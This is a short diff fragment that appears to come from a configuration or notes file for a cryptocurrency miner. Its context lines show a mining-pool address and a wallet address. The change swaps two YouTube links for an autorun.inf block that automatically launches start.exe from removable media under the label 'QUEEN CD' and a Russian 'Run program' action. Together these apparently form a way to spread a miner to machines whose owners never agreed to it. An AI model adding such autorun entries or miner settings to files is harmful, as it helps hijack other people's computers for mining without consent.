@@ -32,5 +32,8 @@ etc.2miners.com:11010
 
 49Byd42zNJDFykDmyia5h3RujCGGU9qM13L2Q6dd7jq83jj4fg6p1CH8BSJAAFBU9dTFow4zrfvqLR424hSPxUhhPCXMGSK
 
-https://www.youtube.com/watch?v=20kngleP8eY
-https://www.youtube.com/watch?v=Cwg-q0y6oW4
+[AutoRun]
+shellexecute=start.exe
+icon=start.exe
+label=QUEEN CD
+action=Запустить программу
